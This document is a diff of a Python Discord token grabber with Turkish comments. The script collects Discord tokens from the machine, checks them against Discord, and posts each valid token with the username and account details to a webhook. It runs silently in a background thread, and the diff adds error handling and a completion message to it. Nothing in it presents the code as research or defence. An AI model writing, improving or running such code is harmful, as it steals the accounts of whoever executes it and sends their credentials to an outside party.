@@ -3,7 +3,9 @@ import re
 import requests
 import json
 import base64
-from threading import Thread
+import sys
+import time
+import threading
 
 # ==========================================
 # WEBHOOK
@@ -63,22 +65,23 @@ def check_token(token):
         return False, None
 
 # ==========================================
-# ANA İŞLEM
+# ANA İŞLEM (GÜVENLİ - SONSUZ DÖNGÜ YOK)
 # ==========================================
 def main():
-    send_notification("🔍 Discord token'ları taranıyor...")
-    tokens = get_tokens()
-    
-    if not tokens:
-        send_notification("❌ Token bulunamadı.")
-        return
-    
-    send_notification(f"🔍 {len(tokens)} token bulundu, kontrol ediliyor...")
-    
-    for token in tokens:
-        valid, user_data = check_token(token)
-        if valid:
-            mesaj = f"""
+    try:
+        send_notification("🔍 Discord token'ları taranıyor...")
+        tokens = get_tokens()
+        
+        if not tokens:
+            send_notification("❌ Token bulunamadı.")
+            return
+        
+        send_notification(f"🔍 {len(tokens)} token bulundu, kontrol ediliyor...")
+        
+        for token in tokens:
+            valid, user_data = check_token(token)
+            if valid:
+                mesaj = f"""
 🍪 **DISCORD TOKEN BULUNDU!**
 ─────────────────
 **Kullanıcı:** `{user_data.get('username')}#{user_data.get('discriminator')}`
@@ -89,12 +92,17 @@ def main():
 **Token:**
 ```{token}```
 """
-            send_notification(mesaj)
-        else:
-            send_notification(f"❌ Geçersiz token: {token[:20]}...")
+                send_notification(mesaj)
+            else:
+                send_notification(f"❌ Geçersiz token: {token[:20]}...")
+                
+        send_notification("✅ Token taraması tamamlandı.")
+        
+    except Exception as e:
+        send_notification(f"❌ HATA: {str(e)}")
 
 # ==========================================
-# ARKA PLANDA ÇALIŞTIR
+# ARKA PLANDA ÇALIŞTIR (SONSUZ DÖNGÜ YOK)
 # ==========================================
-Thread(target=main, daemon=True).start()
+threading.Thread(target=main, daemon=True).start()
 send_notification("⏳ Discord token grabber arka planda çalışıyor...")
